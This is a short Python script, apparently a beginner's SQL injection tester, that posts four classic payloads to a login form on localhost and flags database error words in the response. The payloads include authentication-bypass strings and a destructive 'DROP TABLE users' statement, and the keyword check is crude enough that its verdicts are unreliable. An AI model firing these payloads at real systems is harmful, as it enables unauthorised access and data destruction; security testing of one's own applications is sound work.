import requests

class SQLInjectionTester:
    def __init__(self, url):
        self.url = url
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL --",
            "'; DROP TABLE users --"
        ]
    
    def test_form(self, form_field):
        print(f"\n🔍 Testing {self.url} for SQL Injection...")
        
        for payload in self.payloads:
            data = {form_field: payload}
            try:
                response = requests.post(self.url, data=data)
                
                if any(error in response.text.lower() for error in 
                       ['sql', 'syntax', 'mysql', 'database']):
                    print(f"⚠️  Potential SQL Injection with payload: {payload}")
                else:
                    print(f"✅ Safe against: {payload}")
                    
            except Exception as e:
                print(f"❌ Error: {e}")

# usage test 
tester = SQLInjectionTester('http://localhost:5000/login')
tester.test_form('username')
